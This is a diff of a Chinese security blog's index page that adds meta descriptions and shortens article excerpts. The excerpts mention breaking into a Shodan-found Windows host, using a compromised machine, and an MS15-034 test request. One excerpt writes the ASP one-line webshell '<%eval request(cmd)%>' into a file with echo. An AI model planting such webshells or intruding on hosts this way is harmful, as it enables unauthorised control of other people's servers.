@@ -8,12 +8,15 @@
   
     <meta name="keywords" content="Mochazz,Mochazz's Blog" />
   
-  <meta property="og:type" content="website">
+  <meta name="description" content="喜欢各种与安全相关的东西">
+<meta property="og:type" content="website">
 <meta property="og:title" content="Mochazz&#39;s Blog">
 <meta property="og:url" content="https://mochazz.github.io/index.html">
 <meta property="og:site_name" content="Mochazz&#39;s Blog">
+<meta property="og:description" content="喜欢各种与安全相关的东西">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mochazz&#39;s Blog">
+<meta name="twitter:description" content="喜欢各种与安全相关的东西">
   
   
     <link rel="icon" href="/favicon.ico">
@@ -126,8 +129,7 @@
         </div>
         <div class="article-feed">
             <p>
-                0X00前言前几天在看某个安全会议的PPT，发现里面提了一个漏洞我不怎么了解，但是很有趣，于是就打算通过shodan复现一下。这个漏洞需要对方是windows主机且开启了3389，结果试了一波，没有一台成功，估计是漏洞比较老吧(14年的)。好不容易找到一台开了3389的目标，结果没复现成功，但是通过思考分析还是打开了通往主机的大门。
-0X01实战过程记录首先我原本复现的漏...
+                0X00前言前几天在看某个安全会议的PPT，发现里面提了一个漏洞我不怎么了解，但是很有趣，于是就打算通过shodan复现一下。这个漏洞需要对方是windows主机且开启了3389，结果试了一波，...
             </p>
         </div>
       
@@ -188,7 +190,7 @@
         <div class="article-feed">
             <p>
                 0X00前言本来打算在一台肉鸡上装shadowsocks的，结果无法在肉鸡上监听外网地址的端口，估计是做了内网到外网的端口映射，我在本地虚拟机上搭建成功，所以还是做个笔记。
-0X01搭建ss过程装上python2.7.13装上Node.js v0.11.0windows2003双击安装最新版的nodejs会没反应，所以安装旧版即可。打开cmd，输入npm install ...
+0X01搭建ss过程...
             </p>
         </div>
       
@@ -249,11 +251,7 @@
         <div class="article-feed">
             <p>
                 windows下echo写马错误写马方式
-echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; C:\Users\Mochazz\Desktop\test.asp
-正确写马方式
-echo ^&lt;%eval request(cmd)%^&gt; &gt; C:\Users\Mochazz\Desktop\test.asp
-
-...
+echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; C:\Users\Mochazz\Desktop\t...
             </p>
         </div>
       
@@ -314,8 +312,7 @@ echo ^&lt;%eval request(cmd)%^&gt; &gt; C:\Users\Mochazz\Desktop\test.asp
         <div class="article-feed">
             <p>
                 准备工具unetbootindeepin-15.4.1-amd64.iso还需要两个U盘，一个用来做启动盘，另一个用来装我们的linux系统
-制作linux启动盘这里提供两种安装方式，选择使用已经下载好的iso文件来安装一切就绪后选择退出，重启系统
-安装linux系统到U盘选择通过U盘启动，进入安装deepin安装完成，成功进入deepin linux系统，以后就可以通过...
+制作linux启动盘这里提供两种安装方式，选择使用已...
             </p>
         </div>
       
@@ -375,10 +372,7 @@ echo ^&lt;%eval request(cmd)%^&gt; &gt; C:\Users\Mochazz\Desktop\test.asp
         </div>
         <div class="article-feed">
             <p>
-                前言前一阵子在对某网站进行漏洞扫描时，发现存在MS15-034远程代码执行漏洞。这是一个位于HTTP.SYS中的整数溢出漏洞。UlpParseRange处发生了整数溢出，而在此处导致了安全检查的绕过。具体的分析，还是看360的这篇分析吧。
-漏洞利用通过给IIS服务器发送如下格式的HTTP请求，就可以触发（检测）这个漏洞
-GET / HTTP/1.1
-Host: stuff...
+                前言前一阵子在对某网站进行漏洞扫描时，发现存在MS15-034远程代码执行漏洞。这是一个位于HTTP.SYS中的整数溢出漏洞。UlpParseRange处发生了整数溢出，而在此处导致了安全检查的...
             </p>
         </div>
       
@@ -439,9 +433,7 @@ Host: stuff...
         <div class="article-feed">
             <p>
                 类使用class关键字创建一个类，变量叫属性，函数叫方法。使用new关键字实例化一个对象
-类成员的访问控制Public：可以在任何地方被访问Protected：可被其所在的类的子类和父类访问Private：只能在类内部被访问，子类不能访问父类的私有属性如未声明，默认为public
-常量使用const定义类常量使用this关键字在类内部访问成员变量和方法
-构造函数和析构函数...
+类成员的访问控制Public：可以在任何地方被访问Protected：可被其所在的类的子类和父类访问Pr...
             </p>
         </div>
       
@@ -506,8 +498,7 @@ Host: stuff...
 引用传参
 默认参数
 局部变量函数中的变量无特殊声明，则为动态地分配存储空间，在函数调用后将自动释放。
-静态变量使用static关键字声明，可确保变量的内存地址不变。只有在函数第一次执行时会调用执行static语句，之后调用函数将不再执行。
-全局变量使用global声明变量，是全局变量的一个引用，也可以使用$...
+静态变量使用static关...
             </p>
         </div>
       
@@ -570,11 +561,7 @@ Host: stuff...
                 数组数组操作符使用+操作符号时，如果两个数组有相同的键，将不会添加。
 访问数组
 数组的创建与添加数组元素的添加和删除implode()、explode()数组与字符串互转
-in_array()判断键是否在数组中array_merge()合并数组
-array_combine()
-extrace()将数组转换成标量变量
-array_keys()和array_values()
-...
+in_array()判...
             </p>
         </div>
       
@@ -637,12 +624,7 @@ array_keys()和array_values()
                 字符串单引号变量和转义的序列都不会进行转义，而会原样输出。
 双引号PHP会处理双引号括起来的字符串、变量以及转义序列
 标识符(定界符)需要输出大量文本时，可以使用标识符来定义字符串。
-字符串拼接
-格式化字符串
-获取字符串
-字符串查找
-字符串替换
-正则匹配(1)^PHP           匹配以PHP开头的字符串  [^a-z]           表示匹配所有非小写字母...
+字符串拼接...
             </p>
         </div>
       
@@ -706,10 +688,7 @@ array_keys()和array_values()
 官方推荐风格
 &lt;? 代码 ?&gt;
 短标记风格，需配置文件php.ini中开启short+open_tag
-&lt;% 代码 %&gt;
-ASP风格，需配置文件php.ini中开启asp_tags
-&lt;script language=”php”&gt; 代码 &lt;/script&gt;
-JavaS...
+&lt;% 代码 ...
             </p>
         </div>
       
